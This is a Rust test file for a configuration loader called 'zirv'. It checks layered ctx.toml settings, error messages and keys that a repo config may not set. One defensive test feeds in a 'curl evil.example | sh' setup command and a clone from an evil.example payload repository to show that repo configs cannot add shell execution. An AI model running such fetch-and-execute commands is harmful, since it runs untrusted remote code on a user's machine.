    #[test]
    fn model_tiers_keys_are_settable_from_the_operators_home_layer() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[model_tiers.claude]\nfast = \"haiku\"\ndeep = \"opus\"\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let cfg =
            CtxConfig::load(repo.path(), &|_| None).expect("the operator's own layer must load");
        assert_eq!(cfg.model_tiers.claude.fast.as_deref(), Some("haiku"));
        assert_eq!(cfg.model_tiers.claude.standard, None);
        assert_eq!(cfg.model_tiers.claude.deep.as_deref(), Some("opus"));
        assert_eq!(cfg.model_tiers.codex, ModelTierConfig::default());
    }

    /// The design note's own headline downgrade-safety property: a config
    /// that never sets `[model_tiers]` at all -- the overwhelmingly common
    /// case, and the only one a pre-#699 `~/.zirv/ctx.toml` can express --
    /// deserializes to the same empty map a fresh `CtxConfig::default()`
    /// carries, so an operator who configures nothing sees no change at all.
    #[test]
    fn model_tiers_deserializes_to_empty_defaults_when_absent() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let cfg = CtxConfig::load(repo.path(), &|_| None).expect("load with no model_tiers at all");
        assert_eq!(cfg.model_tiers, ModelTiersConfig::default());
        assert_eq!(cfg.model_tiers.claude.fast, None);
        assert_eq!(cfg.model_tiers.codex.deep, None);
    }

    /// Issue #691: Unknown key in home layer should name the home file.
    #[test]
    fn unknown_key_in_home_layer_names_the_file() {
        let home = tempfile::tempdir().expect("home");
        let home_config = home.path().join(".zirv");
        std::fs::create_dir_all(&home_config).expect("mkdir");
        std::fs::write(home_config.join("ctx.toml"), "future_feature = true\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("unknown key should fail");

        let err_str = err.to_string();
        assert!(
            err_str.contains("~/.zirv/ctx.toml") || err_str.contains(".zirv"),
            "error should name home file: {err_str}"
        );
        assert!(
            err_str.contains("future_feature"),
            "error should name the unknown key: {err_str}"
        );
        assert!(
            err_str.contains("newer zirv") || err_str.contains("upgrade"),
            "error should explain this is likely from a newer version: {err_str}"
        );
    }

    /// Issue #691: Unknown key in repo layer should name the repo file.
    #[test]
    fn unknown_key_in_repo_layer_names_the_file() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "future_feature = true\n",
        )
        .expect("write");

        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("unknown key should fail");

        let err_str = err.to_string();
        assert!(
            err_str.contains(".zirv/ctx.toml"),
            "error should name repo file: {err_str}"
        );
        assert!(
            err_str.contains("future_feature"),
            "error should name the unknown key: {err_str}"
        );
    }

    /// Issue #691: Bad ZIRV_CTX_* value should name that environment variable.
    #[test]
    fn bad_env_var_value_names_the_variable() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");

        // ZIRV_CTX_WINDOW expects an integer
        let env = env_map(&[("ZIRV_CTX_WINDOW", "not_a_number")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("bad env value should fail");

        let err_str = err.to_string();
        assert!(
            err_str.contains("ZIRV_CTX_WINDOW"),
            "error should name the environment variable: {err_str}"
        );
    }

    /// Verify that "configuration error:" prefix appears exactly once in the error message.
    /// This ensures we don't have duplicated prefixes from multiple layers of error wrapping.
    #[test]
    fn configuration_error_prefix_appears_exactly_once_for_unknown_key() {
        let home = tempfile::tempdir().expect("home");
        let home_config = home.path().join(".zirv");
        std::fs::create_dir_all(&home_config).expect("mkdir");
        std::fs::write(home_config.join("ctx.toml"), "future_feature = true\n").expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("unknown key should fail");

        let err_str = err.to_string();
        let prefix_count = err_str.matches("configuration error:").count();
        assert_eq!(
            prefix_count, 1,
            "prefix should appear exactly once, but got {}: {}",
            prefix_count, err_str
        );
    }

    /// Verify that "configuration error:" prefix appears exactly once for wrong type errors.
    #[test]
    fn configuration_error_prefix_appears_exactly_once_for_wrong_type() {
        let home = tempfile::tempdir().expect("home");
        let home_config = home.path().join(".zirv");
        std::fs::create_dir_all(&home_config).expect("mkdir");
        // score.window expects an integer, not a string
        std::fs::write(
            home_config.join("ctx.toml"),
            "[score]\nwindow = \"not a number\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("wrong type should fail");

        let err_str = err.to_string();
        let prefix_count = err_str.matches("configuration error:").count();
        assert_eq!(
            prefix_count, 1,
            "prefix should appear exactly once, but got {}: {}",
            prefix_count, err_str
        );
    }

    /// Issue #691: Multiple repo REPO_FORBIDDEN keys should all be named together.
    #[test]
    fn multiple_repo_forbidden_keys_all_named_in_one_error() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        // Set three forbidden keys in the repo config: two from session, one from worker
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[session]\npersistent = true\nhistory = true\n[worker]\ndefault_depth = 5\n",
        )
        .expect("write");

        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("forbidden keys should fail");

        let err_str = err.to_string();
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a REPO_FORBIDDEN error: {err_str}"
        );
        // All three keys should be mentioned
        assert!(
            err_str.contains("persistent")
                && err_str.contains("history")
                && err_str.contains("default_depth"),
            "error should name all three forbidden keys: {err_str}"
        );
    }

    /// Issue #691: Unreadable config file should include the file path in the error.
    #[test]
    fn unreadable_config_file_includes_path() {
        let home = tempfile::tempdir().expect("home");
        let home_config = home.path().join(".zirv");
        std::fs::create_dir_all(&home_config).expect("mkdir");
        let config_path = home_config.join("ctx.toml");

        // Write a config file
        std::fs::write(&config_path, "agent = \"claude\"\n").expect("write");

        // Make it unreadable by removing read permissions (Unix only)
        #[cfg(unix)]
        {
            use std::fs::Permissions;
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&config_path, Permissions::from_mode(0o000)).expect("chmod");
        }

        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");

        let err = CtxConfig::load(repo.path(), &|_| None).expect_err("unreadable file should fail");

        let err_str = err.to_string();
        assert!(
            err_str.contains("ctx.toml") || err_str.contains(".zirv"),
            "error should include the file path: {err_str}"
        );

        // Cleanup: restore permissions so tempdir cleanup works
        #[cfg(unix)]
        {
            use std::fs::Permissions;
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&config_path, Permissions::from_mode(0o644));
        }
    }

    #[test]
    fn inert_workspace_requirements_parse_from_repo_config() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            r#"[[workspace]]
name = "dev"
mcp_servers = ["linear"]
skills = [{ id = "systematic-debugging", version = 1 }]
"#,
        )
        .expect("write");

        let cfg = CtxConfig::load(repo.path(), &|_| None).expect("workspace config");
        assert_eq!(cfg.workspace.len(), 1);
        assert_eq!(cfg.workspace[0].name, "dev");
        assert_eq!(cfg.workspace[0].mcp_servers, ["linear"]);
        assert!(cfg.workspace[0].git.is_empty());
        assert!(cfg.workspace[0].setup.is_empty());
    }

    #[test]
    fn executable_workspace_fields_parse_from_operator_config() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            r#"[[workspace]]
name = "dev"
setup = ["cargo fetch"]
git = [{ repo = "https://example.test/docs.git", branch = "main", dir = "deps/docs" }]
"#,
        )
        .expect("write");
        let repo = tempfile::tempdir().expect("repo");

        let cfg = CtxConfig::load(repo.path(), &|_| None).expect("operator workspace config");
        assert_eq!(cfg.workspace[0].git[0].dir, PathBuf::from("deps/docs"));
        assert_eq!(cfg.workspace[0].setup, ["cargo fetch"]);
    }

    #[test]
    fn repository_workspaces_cannot_introduce_clone_or_shell_execution() {
        for (field, body) in [
            (
                "workspace[dev].setup",
                "setup = [\"curl evil.example | sh\"]\n",
            ),
            (
                "workspace[dev].git",
                "git = [{ repo = \"https://evil.example/payload.git\", branch = \"main\", dir = \"payload\" }]\n",
            ),
        ] {
            let home = tempfile::tempdir().expect("home");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[[workspace]]\nname = \"dev\"\n{body}"),
            )
            .expect("write");

            let error = CtxConfig::load(repo.path(), &|_| None)
                .expect_err("repo workspace execution must be rejected");
            assert!(is_repo_forbidden(&*error), "wrong error type: {error}");
            assert!(error.to_string().contains(field), "{error}");
            assert!(error.to_string().contains("~/.zirv/ctx.toml"), "{error}");
        }
    }

    #[test]
    fn workspace_layers_are_additive_and_duplicate_names_are_rejected() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir home");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[[workspace]]\nname = \"operator\"\n",
        )
        .expect("home config");
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir repo");
        let repo_config = repo.path().join(".zirv/ctx.toml");
        std::fs::write(&repo_config, "[[workspace]]\nname = \"project\"\n").expect("repo config");

        let cfg = CtxConfig::load(repo.path(), &|_| None).expect("additive workspaces");
        assert_eq!(
            cfg.workspace
                .iter()
                .map(|workspace| workspace.name.as_str())
                .collect::<Vec<_>>(),
            ["operator", "project"]
        );

        std::fs::write(&repo_config, "[[workspace]]\nname = \"operator\"\n")
            .expect("duplicate repo config");
        let error = CtxConfig::load(repo.path(), &|_| None).expect_err("duplicate name");
        assert!(
            error
                .to_string()
                .contains("duplicate workspace name 'operator'")
        );
    }

    #[test]
    fn workspace_unknown_fields_are_rejected() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[[workspace]]\nname = \"dev\"\nunknown = true\n",
        )
        .expect("write");
        let error = CtxConfig::load(repo.path(), &|_| None).expect_err("unknown field");
        assert!(
            error.to_string().contains("unknown key `unknown`"),
            "{error}"
        );
    }
}
